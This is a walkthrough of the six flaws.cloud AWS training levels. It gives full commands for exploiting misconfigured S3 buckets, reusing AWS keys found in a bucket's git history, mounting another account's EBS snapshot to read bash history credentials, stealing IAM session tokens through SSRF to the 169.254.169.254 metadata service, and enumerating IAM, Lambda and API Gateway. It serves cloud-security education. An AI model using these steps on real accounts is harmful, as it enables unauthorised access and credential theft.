<h2>All 6 challenges for this lab can be found at http://flaws.cloud</h2>

<h3>Level 1 target: flaws.cloud</h3>

Step 1: Run nslookup flaws.cloud<br>
This returns 52.92.154.227

Step 2: Run nslookup on 52.92.154.227  <br>
This returns s3-website-us-west-2.amazonaws.com

Step 3: Now that we know that our target is a s3 bucket, let’s check for anonymous access: <br>
aws s3 ls s3://flaws.cloud --no-sign-request

The page returns a listing of the s3 bucket: 

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/26476cbe-67b0-4454-af9d-2ecde00e29c6)

Step 4: Download the secret to our terminal by running the command: <br>
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request

Step 5: Opening the secret shows we have passed level 1:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/b7e04f81-e1c7-4948-a4de-801d56fd5d6a)

---
<h3>Level 2 target: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/ </h3>

Step 1: Run nslookup on level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud <br>
This returns 52.92.200.145 <br>

Step 2: Run nlookup on 52.92.200.145 <br>
This returns s3-us-west-2-w.amazonaws.com

Step 3: Now that we know that our target is a s3 bucket, let’s check for anonymous access: <br>
aws s3 ls s3:// level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request <br>
This time this request returns an ‘Access denied’. 

Step 4: Check for a misconfiguration of enabling "Any Authenticated AWS User" to list the bucket.<br>
To do this we will first need to create an aws user (can use an aws free account to create this user) and then create access keys for this user.  

Once we have an aws user and created access keys, run the command: aws configure --profile testing <br>
When prompted, enter the access keys.

Next, list the s3 bucket with the user we configured: aws --profile testing s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 

This returns a s3 bucket list.

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/c1289b8f-5caa-4642-b9bf-d97b6f9d88f4)

Step 5: Download the secret to our terminal by running the command: <br>
aws --profile testing s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html .

Step 6: Opening the secret shows we have passed level 2:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/bc2e0600-2dfe-47d3-859f-cf256cac555d)

---

<h3>Level 3 target: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</h3>

Step 1: Run nslookup on level3-9afd3927f195e10225021a578e6f78df.flaws.cloud <br>
This returns 52.92.242.211

Step 2: Run nlookup on 52.92.242.211 <br>
This returns s3-website-us-west-2.amazonaws.com

Step 3: Now that we know that our target is a s3 bucket we can test the misconfigurations in level 1 and level 2.  Test for anonymous access to this bucket by running: <br> aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud 

This returns a listing of the s3 bucket:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/ba82ba6c-5bb6-48ec-824f-c1231691c80d)

Step 4: Download the .git repository to our terminal:  <br>
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git . --no-sign-request 

Step 5: Run ‘git log’ and then ‘git diff’ on the 2 logs:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/3742dc6d-d963-40f5-ad3c-83d5ce580faf)

This shows an aws access key and secret access key (this is like a username and password).  

Step 6: Run the command: aws configure --profile testing2 <br>
When prompted, enter the access keys.

Step 7: Check if this profile has any s3 buckets: aws --profile testing2 s3 ls

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/09433e45-0cd0-41cf-985e-464fbff17365)

This returned a number of s3 buckets.  

Step 8: Navigate to level 4 by visiting http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud 

---

<h3>Level 4 target: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud </h3>

Step 1: Navigating to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/ requires a username and password.  

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/b1c2575d-3b3b-4bee-8b14-2c88b39612e6)

Since we are told that the target is an ec2 instance, let’s check if it has any snapshots: aws --profile testing2 ec2 describe-snapshots

This returned a lot of snapshots, so pipe the output into a file.  

Step 2:  Check for backups with: grep -i backup file.txt <br>
That should find a snapshot of "snap-0b49342abd1bdcb89" (unfortunately there is currently an issue where this snapshot is not in the output to the describe-snapshots command).

Step 3: Mount this snapshot on our own ec2 instance to see the snapshot data.  To do this, first create a new volume on our own user (to do this we can use the aws free account we created earlier): aws --profile testing ec2 create-volume --snapshot-id snap-0b49342abd1bdcb89 --availability-zone us-west-2a --region us-west-2  

*Need to guess the correct region until the command works, there aren’t that many US regions so it doesn't take long to guess the correct region.

Next, create an ec2 instance on our free aws user account and attach this volume to that ec2. <br>

Next, ssh into the ec2 instance we created, run the command 'lsblk' to find the attached volume, and then mount the volume by running: sudo mount /dev/xvda /mnt 

Step 4: Go to /mnt and look around for credentials.  Checking in /home/ubuntu/.bash_history shows a username and password of: flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

Step 5: Use these credentials to login to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud to complete level 4.

---
<h3>Level 5 target: http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/</h3>

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/38a641ab-e076-48cd-9552-718cbedebd84)

Step 1: If you can make any sort of HTTP request from an EC2 to an IP of 169.254.169.254, you'll likely get back information the owner would prefer you not see.  169.254.169.254 is a well known IP in the cloud world, in AWS it used to retrieve user data and instance metadata specific to an instance.  Check this by navigating to http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ 

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/8b41282c-c144-4929-9220-c9d5dca7c5b2)

This url shows an accesskeyid and a secretaccesskey. 

Step 2: Configure a user profile with these keys: aws configure --profile testing3 <br>
When prompted, enter the access keys and then manually enter into ~/.aws/credentials into testing3 the aws_session_token (that’s the ‘Token’ value).  

Step 3: Check if can use this profile to list the s3 bucket: aws --profile testing3 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud  

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/5de4d54d-f80c-4542-a7db-95fe9c39778b)

This shows the listing for the bucket.

Step 4: Download the bucket directory: aws --profile testing3 s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ .

Step 5: Opening the downloaded file inside this directory completes level 5.

---
<h3>Level 6 Target</h3>

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/2b504753-3e24-43bc-b2a2-5ffb0befc0f4)

Step 1: Configure a new profile with these access keys.  Since we have previously seen the target use the region of us-west-2, when we configure the user we will set this same region for the user.  

Step 2: Find out who this user is: aws --profile testing4 iam get-user

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/35843a38-cb73-47dd-9742-025427f6b52b)

Step 3: Now that we know we are the user called “Level6”, find what policies this user has: <br>
aws --profile testing4 iam list-attached-user-policies --user-name Level6

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/b09cb496-edd2-48e2-9f4b-a8fb258ec5f6)

The policy list_apigateways is a custom policy.  Custom policies are interesting as they have a greater chance of containing misconfigurations or insecurities.  

Step 4: Check the details for the list_apigateways policy: aws --profile testing4 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/f8cd1bf3-938b-47d7-bcca-7d89896eefe6)

This shows it’s using version 4.  

Step 5: Now that we have the ARN and the version id, we can see what the actual policy is: aws --profile testing4 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/f6464862-91b5-4249-951e-29c3e8b62650)

This shows that we can use this policy to call "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/*"   <br>
A quick google search for ‘aws how to invoke api’ shows the information we need in order to invoke the api:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/23e4b360-ecbc-4cc5-8bd0-5836e8464a7c)

Step 6: Let's look around and see what else this user might have and see if we can find the information we need in order to invoke the api.  Check if there are any lambda functions associated to this user that are using this api: aws --profile testing4 lambda list-functions

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/06ce87d5-1105-459a-9f14-85d13ad60dcc)

This shows there’s a lambda function called “Level6”.

Step 7: Check the details for this lambda function: aws --profile testing4 lambda get-policy --function-name Level6|sed -z 's/,/\n/g'

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/1b7e0c19-92ef-48b3-b4ff-49a5114804f8)

The line showing “arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6” is a pattern for API Gateway ARNs, where “s33ppypa75” is the API Gateway API ID and “GET/level6” specifies the HTTP method (GET) and resource path (/level6). <br>
The only missing piece for invoking the api is the stage name.  

Step 8: To get the stage name: aws --profile testing4 apigateway get-stages --rest-api-id "s33ppypa75"

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/1ada36b4-4cd9-4b39-8c4b-7eaacbac82f2)

This shows that the stageName is “Prod”.

Step 9: Now that we have all the data we need to invoke the api, let’s put it all together and visit the url: https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6 

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/d46c6ebb-6089-4093-ae24-446f9fc195dd)

Step 10: Visit the url the api shows: http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b 

Visiting this url solves level6:

![image](https://github.com/AdamRose1/Cloud_Hacking/assets/93153300/dd4947e2-4a3f-4d72-8cee-f82c2760ff90)
